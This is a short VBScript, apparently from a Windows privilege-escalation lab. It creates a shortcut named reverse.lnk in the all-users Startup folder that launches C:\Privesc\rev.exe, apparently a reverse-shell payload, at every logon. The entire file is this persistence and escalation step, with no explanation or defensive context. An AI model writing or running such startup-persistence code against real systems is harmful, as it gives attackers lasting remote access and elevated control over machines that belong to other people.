Set oWS = WScript.CreateObject("WScript.Shell")
SLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(SLinkFile)
oLink.TargetPath = "C:\Privesc\rev.exe"
oLink.Save
